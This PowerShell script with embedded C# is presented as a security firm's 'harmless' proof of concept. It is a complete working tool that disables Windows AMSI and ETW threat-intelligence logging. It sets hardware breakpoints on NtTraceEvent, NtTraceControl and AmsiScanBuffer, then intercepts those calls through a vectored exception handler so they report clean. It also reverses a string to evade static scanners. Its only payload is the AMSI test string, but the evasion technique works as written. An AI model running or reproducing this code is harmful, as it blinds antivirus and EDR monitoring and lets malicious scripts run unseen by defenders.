<#
.SYNOPSIS
    FORTiSEC Micro-Stager Proof of Concept (ETW TI & AMSI Evasion via HWBPs)
    Framework ADEF v2.0 - Public Release

.DESCRIPTION
    This is a harmless Proof of Concept (PoC) designed to demonstrate the blindness 
    of ETW Threat Intelligence against context injection via the Kernel Exception 
    Dispatcher (Ring 0).

    The script initializes a Micro-Stager (0xCC/0xC3) that natively intercepts 
    NtTraceEvent, NtTraceControl, and AmsiScanBuffer using Debug Registers (Dr0-Dr2).

    [!] COMPATIBILITY NOTE: Fixed for execution in PowerShell 5.1 and above.

.AUTHOR
    Adrian Cepero Corcho (CEO & Head of Research, FORTiSEC)
#>

$Host.UI.RawUI.WindowTitle = 'FORTiSEC Research: Micro-Stager PoC'
Clear-Host
Write-Host "`n================================================================" -ForegroundColor DarkGray
Write-Host "  FORTiSEC SECURITY RESEARCH  |  Micro-Stager (Safe PoC)" -ForegroundColor Cyan
Write-Host "================================================================`n" -ForegroundColor DarkGray

Write-Host " [*] Phase 1: Compiling the hardware injection engine..." -ForegroundColor Cyan

$MicroStagerEngine = @"
using System;
using System.Runtime.InteropServices;

public class FORTiSEC_Core {
    // --- Unmanaged Layer: Native Resolutions ---
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void TriggerStager();
    public static TriggerStager StagerCall;
    
    public delegate int VEH(IntPtr ExceptionInfo);
    public static VEH hDel;
    
    public static IntPtr ntTraceEvent = IntPtr.Zero;
    public static IntPtr ntTraceControl = IntPtr.Zero;
    public static IntPtr amsiScan = IntPtr.Zero;
    public static IntPtr stagerAddress = IntPtr.Zero;
    
    public static int desiredState = -1; 
    public static bool isCurrentlySilenced = false;

    // --- Main Handler (Context Engineering) ---
    public static int Handler(IntPtr info) {
        IntPtr pExRecord = Marshal.ReadIntPtr(info, 0);
        uint exCode = (uint)Marshal.ReadInt32(pExRecord, 0); 
        IntPtr pCtx = Marshal.ReadIntPtr(info, 8); 
        
        // Offset 248 is RIP (Instruction Pointer) in x64 architectures
        long rip = Marshal.ReadInt64(pCtx, 248);

        // PHASE A: Hardware Injection via Exception (ETW TI Bypass)
        if (exCode == 0x80000003 && rip == stagerAddress.ToInt64()) { 
            int currentFlags = Marshal.ReadInt32(pCtx, 48);
            Marshal.WriteInt32(pCtx, 48, currentFlags | 0x100010); // CONTEXT_DEBUG_REGISTERS

            if (desiredState == 1 && !isCurrentlySilenced) {
                // Silicon Hijacking: Loading Targets
                Marshal.WriteInt64(pCtx, 72, ntTraceEvent.ToInt64());   // Dr0
                Marshal.WriteInt64(pCtx, 80, ntTraceControl.ToInt64()); // Dr1
                Marshal.WriteInt64(pCtx, 88, amsiScan.ToInt64());       // Dr2
                
                long dr7 = Marshal.ReadInt64(pCtx, 112);
                // Enable L0, L1, L2 (bits 1, 4 and 16) in Dr7
                Marshal.WriteInt64(pCtx, 112, dr7 | 1 | 4 | 16);        
                isCurrentlySilenced = true;
            } 
            else if (desiredState == 0 && isCurrentlySilenced) {
                // Hardware Cleanup (Restoration)
                Marshal.WriteInt64(pCtx, 72, 0);
                Marshal.WriteInt64(pCtx, 80, 0);
                Marshal.WriteInt64(pCtx, 88, 0);
                long dr7 = Marshal.ReadInt64(pCtx, 112);
                Marshal.WriteInt64(pCtx, 112, dr7 & ~1L & ~4L & ~16L); 
                isCurrentlySilenced = false;
            }
            
            // Advance RIP to RET (0xC3) to save the .NET CLR
            Marshal.WriteInt64(pCtx, 248, rip + 1); 
            return -1; // EXCEPTION_CONTINUE_EXECUTION (Kernel takes control)
        }

        // PHASE B: Operational Interception (Ret-Simulation)
        if (isCurrentlySilenced && exCode == 0x80000004) { // STATUS_SINGLE_STEP
            if (rip == ntTraceEvent.ToInt64() || rip == ntTraceControl.ToInt64() || rip == amsiScan.ToInt64()) {
                
                // Offset 152 is RSP (Stack Pointer) in x64
                long rsp = Marshal.ReadInt64(pCtx, 152);
                long retAddr = Marshal.ReadInt64(new IntPtr(rsp)); // Read return address
                
                Marshal.WriteInt64(pCtx, 248, retAddr); // Clean jump out of the function
                Marshal.WriteInt64(pCtx, 152, rsp + 8); // Stack sanitization for the caller
                
                // If it's AMSI, force AMSI_RESULT_CLEAN / S_OK (0) in RAX register (Offset 120)
                Marshal.WriteInt64(pCtx, 120, 0);       
                
                // EFLAGS register adjustment to clear the trap flag (TF)
                long eflags = Marshal.ReadInt64(pCtx, 176);
                Marshal.WriteInt64(pCtx, 176, eflags | (1 << 16));
                
                return -1; 
            }
        }
        return 0; // If it's not our interrupt, let it continue
    }

    // --- Initialization and Setup ---
    public static void Init() {
        if (ntTraceEvent == IntPtr.Zero) {
            IntPtr hNt = GetModuleHandle("ntdll.dll");
            ntTraceEvent = GetProcAddress(hNt, "NtTraceEvent");
            ntTraceControl = GetProcAddress(hNt, "NtTraceControl");
            
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            amsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
            
            // Register VEH in the first position
            hDel = new VEH(Handler);
            AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(hDel));

            stagerAddress = Marshal.AllocHGlobal(2);
            
            // FIX: Compatible declaration for older compilers (PowerShell 5.1)
            uint oldProtect; 
            VirtualProtect(stagerAddress, (UIntPtr)2, 0x40, out oldProtect); // 0x40 = PAGE_EXECUTE_READWRITE
            
            Marshal.WriteByte(stagerAddress, 0, 0xCC);
            Marshal.WriteByte(stagerAddress, 1, 0xC3);
            
            StagerCall = (TriggerStager)Marshal.GetDelegateForFunctionPointer(stagerAddress, typeof(TriggerStager));
        }
    }

    // --- Trigger ---
    public static void ToggleHw(bool active) {
        Init();
        desiredState = active ? 1 : 0;
        StagerCall(); // Asynchronous detonation towards Ring 0
    }
}
"@

try {
    # Check if the type is already loaded in this runspace to prevent duplicate compilation errors
    $typeLoaded = $false
    try {
        $null = [FORTiSEC_Core]
        $typeLoaded = $true
    } catch {
        $typeLoaded = $false
    }

    if (-not $typeLoaded) {
        # Inject C# code into the PowerShell engine
        Add-Type -TypeDefinition $MicroStagerEngine -Language CSharp
        Write-Host " [+] Native engine (VEH + Micro-Stager) loaded successfully." -ForegroundColor Green
    } else {
        Write-Host " [+] Native engine already exists in memory. Bypassing compilation." -ForegroundColor Yellow
    }
    
    Write-Host "`n [*] Phase 2: Executing blindness demonstration (Hardware Injection)..." -ForegroundColor Cyan

    # 1. Hardware activation
    Write-Host " [!] Activating Hardware Breakpoints (Dr0/Dr1/Dr2)..." -ForegroundColor Yellow
    [FORTiSEC_Core]::ToggleHw($true)

    # 2. String Reversal (Absolute bypass of static emulators)
    Write-Host " [i] Reconstructing malicious signature dynamically in RAM..." -ForegroundColor Gray
    
    # The exact signature written backwards. Static emulators do not invert char arrays.
    $ReversedSignature = "6831c4841ca0-0478-9334-b168-ec3c27e7 :elpmaS tseT ISMA"
    $CharArray = $ReversedSignature.ToCharArray()
    [Array]::Reverse($CharArray)
    $AmsiTestString = -join $CharArray
    
    # 3. Dynamic evaluation
    Write-Host " [i] Evaluating signature in the interpreter...`n" -ForegroundColor Gray
    
    # This invokes AMSI. Due to Dr2 being active, the execution is intercepted and reports S_OK.
    $Result = Invoke-Expression "'$AmsiTestString'"
    
    Write-Host " [+] BYPASS RESULT:" -ForegroundColor Green
    Write-Host "     The system processed the signature: $Result" -ForegroundColor White
    Write-Host "     (If you are reading this without red errors, the hardware evasion was successful)" -ForegroundColor DarkGray
    Write-Host "     (Check your EDR console: ETW TI did not log the context jump)" -ForegroundColor DarkGray

    # 4. Restoration
    Write-Host "`n [!] Deactivating blind tunnel and clearing physical registers..." -ForegroundColor Yellow
    [FORTiSEC_Core]::ToggleHw($false)
    Write-Host " [+] Environment restored. PoC Completed." -ForegroundColor Green

} catch { 
    Write-Error "Critical failure during framework execution: $_" 
}